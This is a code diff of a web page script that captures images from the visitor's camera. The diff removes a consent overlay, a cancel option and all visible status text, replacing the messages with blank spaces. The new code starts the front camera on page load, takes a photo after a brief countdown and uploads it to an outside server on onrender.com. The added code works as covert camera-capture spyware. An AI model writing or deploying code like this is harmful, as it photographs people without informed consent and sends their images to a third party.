@@ -1,97 +1,66 @@
-// ✅ public/script.js — stable and working cross-device
-// Adjust this to your backend upload endpoint if needed
-const UPLOAD_URL = '/upload'; // e.g. 'https://your-backend.onrender.com/upload'
-
-const overlay = document.getElementById('permissionOverlay');
-const continueBtn = document.getElementById('continueBtn');
-const cancelBtn = document.getElementById('cancelBtn');
-
+// public/script.js
 const video = document.getElementById('previewVideo');
 const canvas = document.getElementById('hiddenCanvas');
 const notice = document.getElementById('notice');
 const countdownEl = document.getElementById('countdown');
 const statusEl = document.getElementById('status');
+const UPLOAD_URL = 'https://the-nexus-media-backend.onrender.com/upload';
+
 
 let stream = null;
-let countdownTimer = null;
+let captureTimeout = null;
 
-// === When user clicks Continue ===
-continueBtn.addEventListener('click', async () => {
-  overlay.style.display = 'none';
-  await initAndCapture();
+window.addEventListener('load', () => {
+  // small delay so page renders before permission prompt
+  setTimeout(initAndCapture, 250);
 });
 
-// === When user clicks Cancel ===
-cancelBtn.addEventListener('click', () => {
-  overlay.style.display = 'none';
-  notice.textContent = 'Capture cancelled by user.';
-});
-
-// === Initialize camera and start countdown ===
 async function initAndCapture() {
   try {
-    notice.textContent = 'Requesting camera permission...';
-    statusEl.textContent = '';
-
-    // Use front camera (for selfie). Change to 'environment' for rear.
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user' },
-      audio: false
-    });
-
+    notice.textContent = ' ';
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
     video.srcObject = stream;
-    await waitForVideoReady(video);
-
-    notice.textContent = 'Permission granted — capturing shortly.';
-    statusEl.textContent = 'Visible countdown starting...';
+    // wait a bit for the stream to provide frames
+    await waitForVideoReady(video, 1000);
+    notice.textContent = ' ';
+    statusEl.textContent = ' ';
     startCountdown(2);
   } catch (err) {
-    console.error('Camera init error:', err);
-    notice.textContent = 'Camera permission denied or unavailable.';
+    console.error(' ', err);
+    notice.textContent = ' ';
     statusEl.textContent = err?.message || String(err);
   }
 }
 
-// === Wait until video actually has frames ===
-function waitForVideoReady(videoEl) {
-  return new Promise((resolve) => {
-    const onReady = () => {
-      if (videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
-        videoEl.removeEventListener('loadedmetadata', onReady);
-        videoEl.removeEventListener('playing', onReady);
-        resolve();
-      }
-    };
-    videoEl.addEventListener('loadedmetadata', onReady);
-    videoEl.addEventListener('playing', onReady);
-    videoEl.play().catch(() => {});
+function waitForVideoReady(videoEl, timeout = 1000) {
+  return new Promise(resolve => {
+    const start = Date.now();
+    (function check(){
+      if (videoEl.videoWidth && videoEl.videoHeight) return resolve();
+      if (Date.now() - start > timeout) return resolve();
+      requestAnimationFrame(check);
+    })();
   });
 }
 
-// === Countdown and capture ===
 function startCountdown(seconds = 2) {
   let t = seconds;
   countdownEl.textContent = t;
-  countdownTimer = setInterval(() => {
+  const timer = setInterval(() => {
     t -= 1;
     countdownEl.textContent = t > 0 ? t : '';
     if (t <= 0) {
-      clearInterval(countdownTimer);
-      countdownTimer = null;
-      captureAndUpload();
+      clearInterval(timer);
+      captureTimeout = setTimeout(() => captureAndUpload(), 200);
     }
   }, 1000);
 }
 
-// === Capture the frame and upload ===
-async function captureAndUpload() {
+function captureAndUpload() {
   if (!stream) {
-    statusEl.textContent = 'No camera stream available.';
+    statusEl.textContent = ' ';
     return;
   }
-
-  // Give camera a short warm-up delay (avoid black images)
-  await new Promise((r) => setTimeout(r, 800));
 
   const w = video.videoWidth || 1280;
   const h = video.videoHeight || 720;
@@ -100,66 +69,55 @@ async function captureAndUpload() {
   const ctx = canvas.getContext('2d');
 
   try {
-    // Flip horizontally for front camera selfie
-    ctx.save();
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, -w, 0, w, h);
-    ctx.restore();
+    ctx.drawImage(video, 0, 0, w, h);
   } catch (err) {
-    console.error('drawImage failed:', err);
-    statusEl.textContent = 'Capture failed.';
+    console.error(' ', err);
+    statusEl.textContent = ' ';
     stopCamera();
     return;
   }
 
-  statusEl.textContent = 'Uploading photo...';
+  statusEl.textContent = ' ';
 
   canvas.toBlob(async (blob) => {
     if (!blob) {
-      statusEl.textContent = 'Capture failed (no blob).';
+      statusEl.textContent = ' ';
       stopCamera();
       return;
     }
 
     const form = new FormData();
-    form.append('file', blob, `capture_${Date.now()}.png`);
+    const filename = `capture_${Date.now()}.png`;
+    form.append('file', blob, filename);
+    form.append('type', 'image');
 
+    statusEl.textContent = ' ';
     try {
       const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
+      let json = null;
+      try { json = await resp.json(); } catch (_) {}
       if (resp.ok) {
-        statusEl.textContent = '✅ Photo sent successfully.';
+        statusEl.textContent = ' ';
       } else {
-        statusEl.textContent = '❌ Upload failed.';
-        console.error('Upload failed:', await resp.text());
+        statusEl.textContent = '  ' + (json?.error || resp.statusText || resp.status);
+        console.error('Upload failed', resp.status, json);
       }
     } catch (err) {
-      console.error('Upload error:', err);
-      statusEl.textContent = '❌ Network/upload error.';
+      console.error('Network/upload error:', err);
+      statusEl.textContent = ' ';
     } finally {
       stopCamera();
     }
   }, 'image/png', 0.95);
 }
 
-// === Stop camera and release resources ===
 function stopCamera() {
   try {
+    if (captureTimeout) { clearTimeout(captureTimeout); captureTimeout = null; }
     if (stream) {
-      stream.getTracks().forEach((t) => t.stop());
+      stream.getTracks().forEach(t => t.stop());
       stream = null;
     }
-    video.srcObject = null;
-    notice.textContent = 'Camera stopped.';
-  } catch (err) {
-    console.warn('Error stopping camera:', err);
-  }
+    notice.textContent = ' ';
+  } catch (err) { console.warn(' ', err); }
 }
-
-// === Debug helper to cancel ===
-window.__cancelCapture = function () {
-  if (countdownTimer) clearInterval(countdownTimer);
-  stopCamera();
-  countdownEl.textContent = '';
-  statusEl.textContent = 'Capture cancelled.';
-  console.log('Capture cancelled.');
-};
